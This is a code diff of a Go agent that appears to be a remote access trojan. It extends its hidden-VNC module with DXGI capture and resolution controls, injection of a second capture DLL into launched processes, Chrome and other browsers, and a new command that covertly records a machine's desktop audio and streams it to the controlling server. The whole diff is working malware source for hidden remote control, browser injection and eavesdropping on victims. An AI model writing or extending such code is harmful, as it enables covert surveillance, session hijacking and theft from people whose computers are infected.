@@ -29,13 +29,15 @@ import (
 var ErrReconnect = errors.New("reconnect requested")
 
 var (
-	activeCommands   = make(map[string]context.CancelFunc)
-	activeCommandsMu sync.Mutex
-	voiceSessionMu   sync.Mutex
-	voiceSession     *voiceRuntime
-	hvncInputOnce    sync.Once
-	hvncInputQueue   chan hvncInputEvent
-	hvncInputDropped atomic.Uint64
+	activeCommands      = make(map[string]context.CancelFunc)
+	activeCommandsMu    sync.Mutex
+	voiceSessionMu      sync.Mutex
+	voiceSession        *voiceRuntime
+	desktopAudioMu      sync.Mutex
+	desktopAudioSession *voiceRuntime
+	hvncInputOnce       sync.Once
+	hvncInputQueue      chan hvncInputEvent
+	hvncInputDropped    atomic.Uint64
 )
 
 type hvncInputKind int
@@ -455,11 +457,74 @@ func writeVoiceDownlink(data []byte) error {
 	return nil
 }
 
+func stopDesktopAudioSession() {
+	desktopAudioMu.Lock()
+	v := desktopAudioSession
+	desktopAudioSession = nil
+	desktopAudioMu.Unlock()
+	if v == nil {
+		return
+	}
+	if v.cancel != nil {
+		v.cancel()
+	}
+	if v.session != nil {
+		_ = v.session.Close()
+	}
+}
+
+func startDesktopAudioSession(ctx context.Context, env *runtime.Env, sessionID string, source string) error {
+	if sessionID == "" {
+		return errors.New("missing desktop audio session id")
+	}
+
+	stopDesktopAudioSession()
+
+	vCtx, cancel := context.WithCancel(ctx)
+	session, err := audio.StartCaptureOnlySession(vCtx, source, func(chunk []byte) {
+		if len(chunk) == 0 {
+			return
+		}
+		msg := map[string]interface{}{
+			"type":      "desktop_audio_uplink",
+			"sessionId": sessionID,
+			"data":      chunk,
+		}
+		_ = wire.WriteMsg(vCtx, env.Conn, msg)
+	})
+	if err != nil {
+		cancel()
+		return err
+	}
+
+	v := &voiceRuntime{sessionID: sessionID, cancel: cancel, session: session}
+	desktopAudioMu.Lock()
+	desktopAudioSession = v
+	desktopAudioMu.Unlock()
+
+	return nil
+}
+
 func extractDLLBytes(payload map[string]interface{}) []byte {
 	if payload == nil {
 		return nil
 	}
 	switch v := payload["dll"].(type) {
+	case []byte:
+		return v
+	case string:
+		if len(v) > 0 {
+			return []byte(v)
+		}
+	}
+	return nil
+}
+
+func extractCaptureDLLBytes(payload map[string]interface{}) []byte {
+	if payload == nil {
+		return nil
+	}
+	switch v := payload["capture_dll"].(type) {
 	case []byte:
 		return v
 	case string:
@@ -979,6 +1044,30 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		_ = HVNCCursorControl(ctx, env, enabled)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
+	case "hvnc_enable_dxgi":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		dxgiEnabled := true
+		if payload != nil {
+			if v, ok := payload["enabled"].(bool); ok {
+				dxgiEnabled = v
+			}
+		}
+		log.Printf("hvnc: DXGI capture %v", dxgiEnabled)
+		capture.SetHVNCDXGIEnabled(dxgiEnabled)
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "hvnc_set_resolution":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		maxH := 1080
+		if payload != nil {
+			if v, ok := payloadInt(payload, "maxHeight"); ok {
+				maxH = v
+			}
+		}
+		log.Printf("hvnc: set resolution maxHeight=%d", maxH)
+		capture.SetMaxResolution(maxH)
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
 	case "hvnc_set_quality":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		quality := 90
@@ -1439,10 +1528,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			sendCommandResultSafe(env, cmdID, false, "no DLL provided")
 			return nil
 		}
-		log.Printf("hvnc: start process injected %q search=%q replace=%q dllSize=%d", filePath, searchPath, replacePath, len(dllBytes))
+		captureDllBytes := extractCaptureDLLBytes(payload)
+		log.Printf("hvnc: start process injected %q search=%q replace=%q dllSize=%d captureDllSize=%d", filePath, searchPath, replacePath, len(dllBytes), len(captureDllBytes))
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("hvnc_start_process_injected", nil, func() {
-			if err := capture.StartHVNCProcessInjected(filePath, dllBytes, searchPath, replacePath); err != nil {
+			if err := capture.StartHVNCProcessInjected(filePath, dllBytes, captureDllBytes, searchPath, replacePath); err != nil {
 				log.Printf("hvnc: injected process failed for %q: %v", filePath, err)
 			}
 		})
@@ -1462,9 +1552,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			return nil
 		}
 		log.Printf("hvnc: start chrome injected path=%q dllSize=%d", chromePath, len(dllBytes))
+		captureDllBytes := extractCaptureDLLBytes(payload)
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("hvnc_start_chrome_injected", nil, func() {
-			if err := capture.StartHVNCChromeInjected(chromePath, dllBytes); err != nil {
+			if err := capture.StartHVNCChromeInjected(chromePath, dllBytes, captureDllBytes); err != nil {
 				log.Printf("hvnc: chrome injected failed: %v", err)
 			}
 		})
@@ -1504,6 +1595,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			return nil
 		}
 		log.Printf("hvnc: start browser injected browser=%q path=%q clone=%v cloneLite=%v killIfRunning=%v dllSize=%d", browser, exePath, clone, cloneLite, killIfRunning, len(dllBytes))
+		captureDllBytes := extractCaptureDLLBytes(payload)
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("hvnc_start_browser_injected", nil, func() {
 			var onProgress capture.CloneProgressFunc
@@ -1519,7 +1611,15 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 					})
 				}
 			}
-			if err := capture.StartHVNCBrowserInjected(browser, exePath, dllBytes, clone, cloneLite, killIfRunning, onProgress); err != nil {
+			onDXGIStatus := func(success bool, gpuPID uint32, message string) {
+				_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCDXGIStatus{
+					Type:    "hvnc_dxgi_status",
+					Success: success,
+					GPUPid:  gpuPID,
+					Message: message,
+				})
+			}
+			if err := capture.StartHVNCBrowserInjected(browser, exePath, dllBytes, captureDllBytes, clone, cloneLite, killIfRunning, onProgress, onDXGIStatus); err != nil {
 				log.Printf("hvnc: browser injected failed for %q: %v", browser, err)
 			}
 		})
@@ -1706,6 +1806,22 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		caps := audio.ProbeCapabilities()
 		payload, _ := json.Marshal(caps)
 		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: caps.Available, Message: string(payload)})
+	case "desktop_audio_start":
+		sessionID, _ := envelopePayloadString(envelope, "sessionId")
+		source := "system"
+		payload, _ := envelope["payload"].(map[string]interface{})
+		if payload != nil {
+			if v, ok := payload["source"].(string); ok && strings.TrimSpace(v) != "" {
+				source = strings.TrimSpace(v)
+			}
+		}
+		if err := startDesktopAudioSession(ctx, env, sessionID, source); err != nil {
+			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
+		}
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
+	case "desktop_audio_stop":
+		stopDesktopAudioSession()
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
 	}
 
 	switch action {
